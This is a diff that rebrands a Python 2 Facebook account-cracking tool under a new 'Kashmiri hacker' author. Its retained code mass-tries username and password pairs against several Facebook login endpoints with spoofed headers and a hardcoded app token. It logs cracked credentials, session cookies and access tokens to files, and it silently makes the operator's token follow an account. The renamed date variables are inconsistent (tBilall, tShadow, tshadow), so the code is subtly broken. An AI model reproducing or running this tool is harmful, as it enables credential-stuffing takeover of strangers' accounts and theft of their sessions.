@@ -1,5 +1,5 @@
 # -*- coding: utf-8
-# author by Mark Cornel
+# author by shadow hacker
 import os
 try:
 	import requests
@@ -54,15 +54,15 @@ bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "0
 def logo():
 	os.system("clear")
 	print("""\x1b[0;32m╔════════════════════════════════════════════╗
-\x1b[0;33m║WELCOME TO THANDABABA TOOLS DEVELOPED BY AKASH.  ║
-\x1b[0;33m║       #TOOL AUTHOR [AKASH] SIMPLE BOY BD. ║
+\x1b[0;33m║WELCOME TO My TOOLS ITS CYBER KING  ║
+\x1b[0;33m║       #TOOL AUTHOR KASHMIRI-HACKER.║
 \x1b[0;33m╚════════════════════════════════════════════╝
 \x1b[0;33m ---------------------------------------------
 \x1b[0;33m╔════════════════════════════════════════════╗
-\x1b[0;33m║#WEBSITE     : FOLLOW MY FACEBOOK TO FIND IT.║
-\x1b[0;33m║#FACEBOOK : NAME [THANDA.BABAA ].       ║
-\x1b[0;33m║#GITHUB : https://github.com/THANDABABA.  ║
-\x1b[0;33m║#WHATSAPP : +8801401-127470.                   ║
+\x1b[0;33m║#WEBSITE     : FOLLOW ME ON FACEBOOK.║
+\x1b[0;33m║#FACEBOOK : NAME [KASHMIRI-HACKER ].       ║
+\x1b[0;33m║#GITHUB : https://github.com/error.  ║
+\x1b[0;33m║#WHATSAPP : ********4277                   ║
 \x1b[0;33m╚════════════════════════════════════════════╝""")
 def login():
 	os.system("clear")
@@ -82,7 +82,7 @@ def login():
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
 			#-> bot follow
-			requests.post("https://graph.facebook.com/4/subscribers?access_token="+token)      # Dapunta Khurayra X
+			requests.post("https://graph.facebook.com/4/subscribers?access_token="+token)      # KASHMIRI HACKER
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
@@ -232,7 +232,7 @@ def massal():
 
 def method():
 	print("\n\033[1;93m[\033[1;94m?\033[1;97m] CHOOSE CRACKING METHOD")
-	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mAKASH PRO/FASTER \033[1;97m]")
+	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mKashmiri PRO/FASTER \033[1;97m]")
 	print("\033[1;93m[\033[1;94m2\033[1;97m] MBASIC\033[1;93m [ \033[1;95mFAST \033[1;97m]")
 	print("\033[1;93m[\033[1;94m3\033[1;97m] FREE FACEBOOK\033[1;93m [ \033[1;95mNORMAL\033[1;97m]")
 	method = raw_input("\033[1;93m[\033[1;94m?\033[1;97m] CHOOSE : ")
@@ -269,7 +269,7 @@ def cek_ttl_cp(uid, pw):
 			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 			month, day, year = ttl.split("/")
 			month = bulan_ttl[month]
-			print("\r\033[0;95m[AKASH-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
+			print("\r\033[0;95m[Shadow-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
 			cp.append("%s|%s"%(uid, pw))
 			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 	except KeyError, IOError:
@@ -303,15 +303,15 @@ def bapi(user):
 			headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
 			if "session_key" in send.text and "EAAA" in send.text:
-				print("\r\033[0;94m[AKASH-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
+				print("\r\033[0;94m[Shadow-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
 				ok.append("%s|%s"%(uid, pw))
-				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
+				open("OK/%s.txt"%(tShadow),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "www.facebook.com" in send.json()["error_msg"]:
-				print("\r\033[0;95m[AKASH-CP] %s|%s\033[0;92m        "%(uid, pw))
+				print("\r\033[0;95m[Shadow-CP] %s|%s\033[0;92m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
+				open("CP/%s.txt"%(tshadow),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 
@@ -355,15 +355,15 @@ def mbasic(user):
 			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[0;94m[AKASH-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
+				print("\r\033[0;94m[Shadow-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
-				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
+				open("OK/%s.txt"%(tShadow),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;95m[AKASH-CP] %s|%s\033[0;96m        "%(uid, pw))
+				print("\r\033[0;95m[Shadow-CP] %s|%s\033[0;96m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
+				open("CP/%s.txt"%(tShadow),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 
@@ -407,15 +407,15 @@ def mobile(user):
 			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[0;94m[AKASH-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+				print("\r\033[0;94m[Shadow-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[0;95m[AKASH-CP] %s|%s\033[0;91m        "%(uid, pw))
+				print("\r\033[0;95m[Shadow-CP] %s|%s\033[0;91m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
-				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
+				open("CP/%s.txt"%(tshadow),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 
@@ -459,13 +459,13 @@ def manual():
 				gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 				if "c_user" in ses.cookies.get_dict().keys():
 					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-					print("\r\033[0;94m[AKASH-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
+					print("\r\033[0;94m[Shadow-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 					ok.append("%s|%s"%(uid, pw))
-					open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
+					open("OK/%s.txt"%(tShadow),"a").write(" + %s|%s\n"%(uid, pw))
 					break
 					continue
 				elif "checkpoint" in ses.cookies.get_dict().keys():
-					print("\r\033[0;95m[AKASH-CP] %s|%s\033[0;91m        "%(uid, pw))
+					print("\r\033[0;95m[Shadow-CP] %s|%s\033[0;91m        "%(uid, pw))
 					cp.append("%s|%s"%(uid, pw))
 					open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 					break
